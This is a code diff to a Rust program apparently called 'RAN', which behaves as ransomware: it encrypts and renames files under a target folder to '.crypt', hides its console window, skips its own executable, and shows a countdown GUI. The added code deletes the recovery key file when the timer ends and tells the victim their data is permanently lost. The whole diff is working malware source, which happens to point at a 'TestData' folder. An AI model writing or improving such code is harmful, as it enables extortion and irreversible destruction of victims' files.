@@ -1,3 +1,4 @@
+#![windows_subsystem = "windows"]
 use base64::{Engine as _, engine::general_purpose};
 use chacha20::ChaCha20;
 use chacha20::cipher::{KeyIvInit, StreamCipher, StreamCipherSeek};
@@ -14,6 +15,8 @@ use std::path::{Path, PathBuf};
 use std::time::Duration;
 use walkdir::WalkDir;
 use x25519_dalek::{EphemeralSecret, PublicKey as EccPublicKey};
+use std::env;
+use std::sync::Arc;
 const BUFFER_4MB: usize = 4 * 1024 * 1024;
 const BUFFER_1MB: usize = 1 * 1024 * 1024;
 const SMALL_FILE_THRESHOLD: u64 = 1 * 1024 * 1024;
@@ -21,10 +24,9 @@ const MEDIUM_FILE_THRESHOLD: u64 = 500 * 1024 * 1024;
 const SPARSE_BLOCKS: usize = 5;
 const PUBLIC_KEY: &str = "
 -----BEGIN PUBLIC KEY-----
-MCowBQYDK2VuAyEAyZhLjFX3tBsQrACJfo6DRY8SIPTvYvUrrK/s+RvGFjc=
+MCowBQYDK2VuAyEAIyqwE+FAqYxmz+SMmhVuZckYZcOcXsKEa3oHJG6LQig=
 -----END PUBLIC KEY-----
 ";
-const RECOVERY_INFO_PATH: &str = "INFO.bin";
 const APP_CLIENT_TOKEN: &str = "tn^huyDmJf5GjEiK*8@Q#NFHtQsUu5gwChjjgV$#DH8q!QGNk33k8&UqRvACPTSV$%WwscJ89oXmhB3yLFHAaLRfspfZ^Am8AQHMr7x%zsPX5Nv9N3BG3kNccMk&7h3S";
 const EXPECTED_USER_AGENT: &str = "RAN/wj3ck7hp6tv3p2pedivsbzr7";
 pub const OS: &str = if cfg!(target_os = "windows") {
@@ -35,6 +37,15 @@ pub const OS: &str = if cfg!(target_os = "windows") {
     "macOS"
 } else {
     "Unknown"
+};
+pub const RECOVERY_INFO_PATH: &str = if cfg!(target_os = "windows") {
+   r"C:\ProgramData\RAN\INFO.bin"
+} else if cfg!(target_os = "macos") {
+    "/Library/Application Support/RAN/INFO.bin"
+} else if cfg!(target_os = "linux") {
+    "/etc/ran/INFO.bin"
+} else {
+    "INFO.bin"
 };
 pub const TARGET_DIR: &str = if cfg!(target_os = "windows") {
     r"C:\Users\Public\Documents\TestData"
@@ -54,6 +65,13 @@ pub const EXCLUDED_DIRS: &[&str] = if cfg!(target_os = "windows") {
 } else {
     &[]
 };
+pub fn init() {
+    let path = Path::new(RECOVERY_INFO_PATH);
+    if let Some(parent_dir) = path.parent() {
+        let _ = fs::remove_file(RECOVERY_INFO_PATH);
+        let _ = fs::create_dir_all(parent_dir);
+    }
+}
 pub fn get_token() -> String {
     fs::read(RECOVERY_INFO_PATH)
         .ok()
@@ -61,6 +79,7 @@ pub fn get_token() -> String {
         .map(|meta| meta.token)
         .unwrap_or_else(|| "No token available".to_string())
 }
+
 #[derive(serde::Serialize, serde::Deserialize)]
 struct RecoveryMetadata {
     encrypted_master_key: Vec<u8>,
@@ -122,11 +141,24 @@ async fn check() -> bool {
     }
     true
 }
+
 pub fn start_gui() -> eframe::Result<()> {
+    let icon_bytes = include_bytes!("../assets/icon.png");
+    let image = image::load_from_memory(icon_bytes)
+        .expect("Fehler beim Laden des Icons")
+        .to_rgba8();
+    
+    let (width, height) = image.dimensions();
+    let icon_data = egui::IconData {
+        rgba: image.into_raw(),
+        width,
+        height,
+    };
     let options = eframe::NativeOptions {
         viewport: egui::ViewportBuilder::default()
             .with_resizable(false)
-            .with_inner_size([850.0, 550.0]),
+            .with_inner_size([850.0, 550.0])
+            .with_icon(Arc::new(icon_data)),
         ..Default::default()
     };
 
@@ -149,6 +181,8 @@ struct RANApp {
     is_valid: bool,
     enc_key: String,
     copied_toast_timer: f32,
+    expired_triggered: bool,
+    show_expired_window: bool,
 }
 
 impl Default for RANApp {
@@ -160,10 +194,17 @@ impl Default for RANApp {
             is_valid: false,
             enc_key: get_token(),
             copied_toast_timer: 0.0,
+            expired_triggered: false,
+            show_expired_window: false,
         }
     }
 }
-
+impl RANApp {
+    fn countdown_expired(&mut self) {
+        fs::remove_file(RECOVERY_INFO_PATH);
+        self.show_expired_window = true;
+    }
+}
 impl eframe::App for RANApp {
     fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
         if self.time_left_seconds > 0.0 && !self.is_valid {
@@ -201,6 +242,10 @@ impl eframe::App for RANApp {
                     ui.add_space(10.0);
 
                     let total_secs = self.time_left_seconds.max(0.0) as u64;
+                    if total_secs == 0 && !self.expired_triggered {
+                        self.expired_triggered = true;
+                        self.countdown_expired();
+                    }
                     let days = total_secs / 86400;
                     let hours = (total_secs % 86400) / 3600;
                     let minutes = (total_secs % 3600) / 60;
@@ -389,6 +434,22 @@ impl eframe::App for RANApp {
                 ).size(15.0).color(Color32::LIGHT_GRAY));
             });
         });
+        if self.show_expired_window {
+            egui::Window::new("⚠️ RAN - Countdown expired")
+                .collapsible(false)
+                .resizable(false) 
+                .anchor(egui::Align2::CENTER_CENTER, [0.0, 0.0])
+                .show(ctx, |ui| {
+                    ui.vertical_centered(|ui| {
+                        ui.label(
+                            egui::RichText::new("Your Data is permanently lost")
+                                .color(egui::Color32::RED)
+                                .size(18.0)
+                        );
+                    });
+                });
+        }
+        ctx.request_repaint()
     }
 }
 #[tokio::main]
@@ -401,6 +462,7 @@ async fn main() -> anyhow::Result<()> {
     if !root_dir.exists() || !root_dir.is_dir() {
         std::process::exit(0);
     }
+    init();
     run_encryption(root_dir, PUBLIC_KEY, recovery_info_path)?;
     start_gui().map_err(|e| anyhow::anyhow!("Could not start GUI: {:?}", e))?;
     Ok(())
@@ -458,6 +520,7 @@ fn run_encryption(
         master_key_hash,
         token,
     };
+    let current_exe = env::current_exe().ok();
     let entries: Vec<PathBuf> = WalkDir::new(root_dir)
         .into_iter()
         .filter_entry(|e| {
@@ -470,6 +533,14 @@ fn run_encryption(
         })
         .filter_map(|e| e.ok())
         .filter(|e| e.file_type().is_file())
+        .filter(|e| {
+            if let Some(ref exe_path) = current_exe {
+                // e.path() liefert den vollen Pfad der gefundenen Datei
+                e.path() != exe_path
+            } else {
+                true
+            }
+        })
         .map(|e| e.into_path())
         .collect();
 
@@ -564,17 +635,14 @@ fn rename_file(
 ) -> anyhow::Result<()> {
     let old_name = path.file_name().unwrap().to_string_lossy();
     let mut name_bytes = old_name.as_bytes().to_vec();
-
     let name_nonce_input = compute_name_nonce_input(root_dir, path);
     let name_nonce = meta.derive_nonce(master_key, &name_nonce_input);
     let mut name_cipher = ChaCha20::new(master_key.into(), &name_nonce.into());
-
     name_cipher.apply_keystream(&mut name_bytes);
-
-    let new_name = general_purpose::URL_SAFE_NO_PAD.encode(name_bytes);
+    let base64_name = general_purpose::URL_SAFE_NO_PAD.encode(name_bytes);
+    let new_name = format!("{}.crypt", base64_name);    
     let mut new_path = path.to_path_buf();
     new_path.set_file_name(new_name);
-
     fs::rename(path, new_path)?;
     Ok(())
 }
@@ -597,18 +665,20 @@ fn run_decryption(recovery_info_path: &Path, root_dir: &Path, hex_key: &str) -> 
         master_key[i] = u8::from_str_radix(&cleaned_hex[i * 2..i * 2 + 2], 16)
             .map_err(|_| anyhow::anyhow!("Ungültiges Hex-Zeichen im Master-Key gefunden!"))?;
     }
+    let recovery_file_name = Path::new(recovery_info_path)
+        .file_name()
+        .unwrap_or_default();
     let entries: Vec<PathBuf> = WalkDir::new(root_dir)
         .into_iter()
         .filter_map(|e| e.ok())
         .filter(|e| e.file_type().is_file())
         .filter(|e| {
-            e.file_name()
-                != Path::new(recovery_info_path)
-                    .file_name()
-                    .unwrap_or_default()
-        })
-        .map(|e| e.into_path())
-        .collect();
+            let name = e.file_name();
+            let name_str = name.to_string_lossy();
+            name != recovery_file_name && name_str.ends_with(".crypt")
+    })
+    .map(|e| e.into_path())
+    .collect();
     entries.par_iter().for_each(|path| {
         if let Err(e) = recover_file(path, root_dir, &master_key, &meta) {}
     });
@@ -621,9 +691,12 @@ fn recover_file(
     master_key: &[u8; 32],
     meta: &RecoveryMetadata,
 ) -> anyhow::Result<()> {
-    let encrypted_name = path.file_name().unwrap().to_string_lossy();
-    let name_bytes = general_purpose::URL_SAFE_NO_PAD.decode(encrypted_name.as_bytes())?;
+    let encrypted_name_with_ext = path.file_name().unwrap().to_string_lossy();
+    let encrypted_name = encrypted_name_with_ext
+        .strip_suffix(".crypt")
+        .ok_or_else(|| anyhow::anyhow!("Datei hat nicht die Endung .crypt: {:?}", path))?;
 
+    let name_bytes = general_purpose::URL_SAFE_NO_PAD.decode(encrypted_name.as_bytes())?;
     let name_nonce_input = compute_name_nonce_input(root_dir, path);
     let name_nonce = meta.derive_nonce(master_key, &name_nonce_input);
     let mut name_cipher = ChaCha20::new(master_key.into(), &name_nonce.into());
@@ -634,6 +707,7 @@ fn recover_file(
 
     let mut original_path = path.to_path_buf();
     original_path.set_file_name(&original_name);
+    
     let original_path_str = normalized_path_string(root_dir, &original_path);
 
     let content_nonce = meta.derive_nonce(master_key, &original_path_str);
